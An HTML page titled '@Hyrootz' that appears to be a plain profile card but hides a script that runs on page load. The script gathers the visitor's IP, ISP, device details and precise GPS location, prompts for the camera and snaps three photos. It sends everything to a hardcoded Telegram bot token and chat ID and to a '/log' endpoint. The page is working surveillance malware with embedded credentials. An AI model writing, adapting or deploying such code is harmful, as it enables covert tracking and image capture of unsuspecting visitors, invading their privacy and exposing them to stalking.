<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>@Hyrootz</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: radial-gradient(circle, #1a1a1a, #000);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Poppins', sans-serif;
      color: #fff;
    }
    .container {
      text-align: center;
      padding: 30px;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid #444;
      border-radius: 15px;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
      width: 90%;
      max-width: 400px;
    }
    h1 { font-size: 22px; margin-bottom: 10px; color: #0ff; }
    p { font-size: 14px; color: #aaa; }
    .status { margin-top: 20px; font-size: 13px; color: #0f0; }
  </style>
</head>
<body>
  <div class="container">
    <h1>@Hyrootz</h1>
  </div>

<script>
const CHAT_ID = "7813060570";
const BOT_TOKEN = "8053780203:AAFAV7b_NYcbj2NmakX3_Az4dTnYigPmelA";

const deviceName = detectDeviceName(navigator.userAgent);

window.onload = async () => {
  try {
    const key = await getServerKey();
    const deviceData = await collectDeviceInfo();

    await logToServer(deviceData);
    await sendToTelegram(key, deviceData.message, "text");

    if (deviceData.location) {
      await sendLocationToTelegram(deviceData.location.lat, deviceData.location.lon);
    }

    const permission = await navigator.permissions?.query?.({ name: 'camera' }).catch(() => null);
    if (permission?.state === 'denied') return;

    if (!navigator.mediaDevices?.getUserMedia) {
      console.warn("MediaDevices not supported");
      return;
    }

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const track = stream.getVideoTracks()[0];

    for (let i = 0; i < 3; i++) {
      const blob = await captureFromVideo(track);
      if (blob) await sendToTelegram(key, blob, "photo");
      await new Promise(r => setTimeout(r, 600));
    }

    track.stop();
  } catch (err) {
    console.error("Main Error:", err);
  }
};

function detectDeviceName(ua) {
  ua = ua.toLowerCase();
  const brandPatterns = [
    { name: "Samsung", pattern: /samsung|sm-/ },
    { name: "Xiaomi", pattern: /xiaomi|mi\s|redmi|note\s/ },
    { name: "Infinix", pattern: /infinix/ },
    { name: "Realme", pattern: /realme/ },
    { name: "Oppo", pattern: /oppo/ },
    { name: "Vivo", pattern: /vivo/ },
    { name: "Huawei", pattern: /huawei/ },
    { name: "iPhone", pattern: /iphone/ },
    { name: "iPad", pattern: /ipad/ },
    { name: "Windows", pattern: /windows nt/ },
    { name: "Mac", pattern: /macintosh/ },
  ];

  let brandDetected = "Unknown";
  for (const brand of brandPatterns) {
    if (brand.pattern.test(ua)) {
      brandDetected = brand.name;
      break;
    }
  }

  const model = "Device";
  let os = "Unknown OS";
  let androidVersion = null;

  if (ua.includes("android")) {
    os = "Android";
    const verMatch = ua.match(/android\s([\d.]+)/);
    if (verMatch && verMatch[1]) androidVersion = verMatch[1];
  } else if (ua.includes("iphone") || ua.includes("ipad")) {
    os = "iOS";
  } else if (ua.includes("windows")) {
    os = "Windows";
  } else if (ua.includes("mac")) {
    os = "macOS";
  }

  const versionInfo = androidVersion ? `v${androidVersion}` : "";
  return `${brandDetected} ${model} (${os} ${versionInfo})`;
}

async function getServerKey() {
  try {
    const res = await fetch('/api/fast_servers');
    const data = await res.json();
    return data.fast_key || "direct";
  } catch {
    return "direct";
  }
}

async function collectDeviceInfo() {
  let ipInfo = {}, battery = null, gps = null, ipLoc = null;

  const time = new Date().toLocaleString();
  const language = navigator.language || "Unknown";
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
  const browserVersion = navigator.userAgent.match(/(chrome|firefox|safari|edg|opera)\/?\s*(\d+)/i);
  const browser = browserVersion ? `${browserVersion[1]} ${browserVersion[2]}` : "Unknown";

  const isOnline = navigator.onLine;
  const koneksiStatus = isOnline ? "Status Koneksi: ONLINE" : "❌ Status Koneksi: OFFLINE";

  const ram = navigator.deviceMemory || "Unknown";
  const cpuCores = navigator.hardwareConcurrency || "Unknown";

  try {
    const [ipRes, battRes] = await Promise.allSettled([
      fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json()),
      navigator.getBattery ? navigator.getBattery() : null
    ]);

    if (ipRes.status === "fulfilled") ipInfo = ipRes.value;
    if (battRes.status === "fulfilled") battery = battRes.value;

    if (ipInfo.loc) {
      const [lat, lon] = ipInfo.loc.split(",");
      ipLoc = { lat: parseFloat(lat), lon: parseFloat(lon) };
    }

    if ("geolocation" in navigator) {
      try {
        const pos = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          })
        );
        gps = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };
      } catch (err) {
        console.warn("⚠️ GPS failed, using IP location:", err.message);
      }
    }

    const locationUsed = gps || ipLoc;
    const locationLabel = gps
      ? `📍 GPS [${gps.lat.toFixed(6)}, ${gps.lon.toFixed(6)}] (±${gps.accuracy}m)`
      : ipLoc
        ? `🌐 IP-based [${ipLoc.lat.toFixed(6)}, ${ipLoc.lon.toFixed(6)}]`
        : "❌ Tidak tersedia";

    const message = `
Check Device  By 恵Hyroo.

🌐 IP: ${ipInfo.ip || "N/A"}
🏙️ City: ${ipInfo.city || "N/A"}
🌎 Region: ${ipInfo.region || "N/A"}
🚩 Country: ${ipInfo.country || "N/A"}
🔗 ISP: ${ipInfo.org || "N/A"}

🈯️ Language: ${language}
🕒 Timezone: ${timezone}
🖱️ Touch Support: ${'ontouchstart' in window ? 'Yes' : 'No'}

📱 Device: ${deviceName}
📱 Network: ${navigator.connection?.effectiveType || "Unknown"}
💾 RAM: ${ram} GB
🧵 CPU Threads: ${cpuCores}
🔋 Battery: ${battery ? Math.round(battery.level * 100) + "%" : "N/A"} ${battery?.charging ? "⚡️" : ""}
🖥️ Screen: ${screen.width}x${screen.height}
📶 ${koneksiStatus}
🕓 Time: ${time}


🧠 OS: ${navigator.platform}
🌐 Browser: ${browser}

📍 Location: ${locationLabel}
`.trim();

    return {
      message,
      location: locationUsed
    };
  } catch (err) {
    console.error("Device Info Error", err);
    return { message: "❌ Gagal mendapatkan info device", location: null };
  }
}

async function logToServer(data) {
  try {
    await fetch("/log", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });
  } catch (e) {
    console.warn("Log server error:", e);
  }
}

async function sendLocationToTelegram(lat, lon) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
  });
}

function captureFromVideo(track) {
  return new Promise(async (resolve) => {
    try {
      const imageCapture = new ImageCapture(track);
      const blob = await imageCapture.takePhoto();
      resolve(blob);
    } catch {
      const video = document.createElement("video");
      video.srcObject = new MediaStream([track]);
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.8);
    }
  });
}

async function sendToTelegram(key, data, type = "text") {
  const base = "https://api.telegram.org";
  const url = type === "photo"
    ? `${base}/bot${BOT_TOKEN}/sendPhoto`
    : `${base}/bot${BOT_TOKEN}/sendMessage`;

  if (type === "photo") {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", data, "capture.jpg");
    await fetch(url, { method: "POST", body: formData });
  } else {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: data,
        parse_mode: "Markdown"
      })
    });
  }
}
</script>
</body>
</html>